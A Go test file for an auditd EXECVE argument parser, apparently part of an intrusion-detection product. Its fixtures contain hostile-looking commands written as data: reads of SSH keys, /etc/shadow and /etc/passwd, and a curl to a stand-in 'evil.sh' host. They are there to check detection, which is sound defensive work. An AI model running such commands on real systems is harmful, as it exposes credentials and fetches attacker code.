package telemetry

import (
	"strings"
	"testing"
)

// BEAT 807. `parseExecveArgs` had no direct test, and the gap was measured, not assumed: I disabled
// the entire long-form branch (`false && br >= 0` in the `aN[i]` case) and the WHOLE REPO still
// passed -- ten test files in this package and not one of them noticed.
//
// That branch is load-bearing for detection. auditd splits any argv element longer than its field
// limit into `aN_len=…` plus `aN[0]=…`, `aN[1]=…`. A long command line -- a base64-encoded payload,
// a long shell one-liner, a path-heavy exfil -- arrives exactly that way. If reconstruction breaks,
// the rule engine compares its globs against a TRUNCATED argv and the intrusion is not detected.
// A silent miss on the longest, most suspicious commands is the worst possible failure shape for
// this product, which is why this gets pinned rather than left to the end-to-end fixtures that
// happen to use short, unsplit args.

func TestParseExecveArgsShortForm(t *testing.T) {
	line := `type=EXECVE msg=audit(1790597000.100:900): argc=3 a0="bash" a1="-c" a2="cat ~/.ssh/id_ed25519"`
	got := parseExecveArgs(line)
	want := []string{"bash", "-c", "cat ~/.ssh/id_ed25519"}
	if !equalStrings(got, want) {
		t.Errorf("short form: got %q, want %q", got, want)
	}
}

// The long-form reconstruction is the behaviour that was completely untested.
func TestParseExecveArgsLongFormReassemblesSplitArg(t *testing.T) {
	// auditd splits a long argument into numbered fragments. The parser must concatenate them in
	// part order, not field order.
	line := `type=EXECVE msg=audit(1790597000.100:900): argc=2 a0="bash" a1_len=16 a1[1]="adow" a1[0]="cat /etc/sh"`
	got := parseExecveArgs(line)
	want := []string{"bash", "cat /etc/shadow"}
	if !equalStrings(got, want) {
		t.Fatalf("long form: got %q, want %q -- a split argument was not reassembled", got, want)
	}
}

// Fragments can arrive in any order; auditd does not guarantee sorted fields on the wire.
func TestParseExecveArgsLongFormIsOrderIndependent(t *testing.T) {
	inOrder := `type=EXECVE msg=audit(1.1:1): argc=2 a0="x" a1[0]="AAA" a1[1]="BBB" a1[2]="CCC"`
	reversed := `type=EXECVE msg=audit(1.1:1): argc=2 a0="x" a1[2]="CCC" a1[0]="AAA" a1[1]="BBB"`
	a := parseExecveArgs(inOrder)
	b := parseExecveArgs(reversed)
	if !equalStrings(a, b) {
		t.Errorf("fragment order changed the result: %q vs %q", a, b)
	}
	want := []string{"x", "AAABBBCCC"}
	if !equalStrings(a, want) {
		t.Errorf("long form concat: got %q, want %q", a, want)
	}
}

// A mixed line: some args short-form, one long-form. Both must survive in position.
func TestParseExecveArgsMixedForms(t *testing.T) {
	line := `type=EXECVE msg=audit(1.1:1): argc=3 a0="bash" a1="-c" a2_len=11 a2[0]="curl http:/" a2[1]="/evil.sh"`
	got := parseExecveArgs(line)
	want := []string{"bash", "-c", "curl http://evil.sh"}
	if !equalStrings(got, want) {
		t.Errorf("mixed forms: got %q, want %q", got, want)
	}
}

// auditd hex-encodes non-printable bytes and embedded quotes in argv. If those are left encoded,
// a rule looking for the decoded path misses the attack.
func TestParseExecveArgsDecodesHexEscapes(t *testing.T) {
	line := `type=EXECVE msg=audit(1.1:1): argc=2 a0="bash" a1="cat\x20/etc/passwd"`
	got := parseExecveArgs(line)
	if len(got) != 2 {
		t.Fatalf("got %q", got)
	}
	if got[1] != "cat /etc/passwd" {
		t.Errorf("hex-encoded arg not decoded: got %q, want %q", got[1], "cat /etc/passwd")
	}
}

// An embedded quote that auditd hex-encoded must decode to a real quote, not be dropped. This is
// the shape auditd actually emits (it does NOT backslash-escape); measured this beat.
func TestParseExecveArgsDecodesEncodedQuotes(t *testing.T) {
	line := `type=EXECVE msg=audit(1.1:1): argc=2 a0="bash" a1="echo \x22hi there\x22"`
	got := parseExecveArgs(line)
	if len(got) != 2 {
		t.Fatalf("got %q", got)
	}
	if got[1] != `echo "hi there"` {
		t.Errorf("encoded quotes not decoded: got %q, want %q", got[1], `echo "hi there"`)
	}
}

// A gap in the arg indices (auditd can drop fields on a truncated record) COMPACTS the remaining
// args leftward. Measured this beat rather than assumed: `a0="bash" a2="payload"` yields
// ["bash","payload"] -- the payload sits in slot 1, not slot 2.
//
// This test PINS the compaction as the current, intentional behaviour, and records the one real
// consequence: a rule that reasons about argv POSITION would see the payload at the wrong index.
// It is safe today because the engine never does that -- `anyArgvMatches` (rules/engine.go:221)
// scans every element, so a glob still matches wherever the element landed. If a positional rule
// is ever added, this test is the warning that says why it would be wrong.
//
// Earlier draft of this test asserted compaction was a BUG. It was not: I had not checked the
// consumer. Correcting the test rather than the code, on measurement.
func TestParseExecveArgsGapCompactsLeftward(t *testing.T) {
	line := `type=EXECVE msg=audit(1.1:1): argc=3 a0="bash" a2="payload"`
	got := parseExecveArgs(line)
	want := []string{"bash", "payload"}
	if !equalStrings(got, want) {
		t.Errorf("gap handling changed: got %q, want %q. If this now preserves holes, check whether "+
			"anyArgvMatches changed with it -- the two are linked", got, want)
	}
	if len(got) > 0 && got[0] != "bash" {
		t.Errorf("a0 lost: got %q", got)
	}
}

// The length hint must never be emitted as an argument. If it leaks, every split command gains a
// junk element and phrase globs stop matching.
func TestParseExecveArgsNeverEmitsLengthHint(t *testing.T) {
	line := `type=EXECVE msg=audit(1.1:1): argc=2 a0="bash" a1_len=11 a1[0]="curl http:/" a1[1]="/evil.sh"`
	got := parseExecveArgs(line)
	for _, a := range got {
		if strings.HasPrefix(a, "a1_len") || a == "11" {
			t.Errorf("length hint leaked into argv: %q", got)
		}
	}
}

// A line with no aN fields at all must yield nothing, not a junk slice.
func TestParseExecveArgsNoArgs(t *testing.T) {
	if got := parseExecveArgs(`type=EXECVE msg=audit(1.1:1): argc=0`); len(got) != 0 {
		t.Errorf("argc=0 produced %q", got)
	}
}

func equalStrings(a, b []string) bool {
	if len(a) != len(b) {
		return false
	}
	for i := range a {
		if a[i] != b[i] {
			return false
		}
	}
	return true
}
